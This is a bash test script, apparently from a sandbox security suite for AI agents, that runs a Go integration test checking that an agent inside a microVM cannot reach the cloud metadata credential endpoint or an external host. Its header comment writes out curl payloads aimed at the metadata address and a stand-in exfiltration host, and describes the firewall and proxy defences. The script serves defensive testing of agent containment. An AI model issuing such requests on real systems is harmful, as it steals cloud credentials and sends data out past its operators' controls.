#!/usr/bin/env bash
# 03-exfil.sh — Scenario 3: Unauthorized network exfiltration.
#
# Payloads:
#   curl http://169.254.169.254/...      — AWS IMDS credential endpoint
#   curl http://exfil-sink.invalid/...   — arbitrary external host
#
# Threat:    An agent tries to exfiltrate data or steal cloud credentials by
#            making outbound HTTP requests.
# Boundary:  Default sandboxes have "none" networking (no TAP interface).
#            Even with TAP, nftables default-deny + Squid block non-allowlist
#            domains and the IMDS address.
# Expect:    Both curl calls fail (ENETUNREACH / timeout / connection refused).
#            Markers IMDS_REACHABLE and EGRESS_REACHABLE do NOT appear in output.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=common.sh
source "${SCRIPT_DIR}/common.sh"

require_env FC_KERNEL
require_env FC_ROOTFS
require_kvm

section "Scenario 03: Network exfiltration blocked"

# ── run the Go integration test ───────────────────────────────────────────────

if [[ -n "${ADVERSARIAL_TESTBIN:-}" && -x "${ADVERSARIAL_TESTBIN}" ]]; then
  TEST_OUTPUT=$(FC_KERNEL="${FC_KERNEL}" FC_ROOTFS="${FC_ROOTFS}" \
    "${ADVERSARIAL_TESTBIN}" -test.v -test.run=TestAdversarialNetworkExfil \
    -test.timeout=120s 2>&1 || true)
else
  TEST_OUTPUT=$(FC_KERNEL="${FC_KERNEL}" FC_ROOTFS="${FC_ROOTFS}" \
    go test -v -tags=integration -run=TestAdversarialNetworkExfil \
    -timeout=120s ./test/adversarial/ 2>&1 || true)
fi

echo "$TEST_OUTPUT"

# ── assertions ────────────────────────────────────────────────────────────────

assert_not_contains \
  "IMDS (169.254.169.254) is not reachable from guest" \
  "$TEST_OUTPUT" "IMDS_REACHABLE"

assert_not_contains \
  "Arbitrary egress is blocked" \
  "$TEST_OUTPUT" "EGRESS_REACHABLE"

assert_contains "Go test reported PASS" "$TEST_OUTPUT" "PASS"

scenario_result "03-exfil"
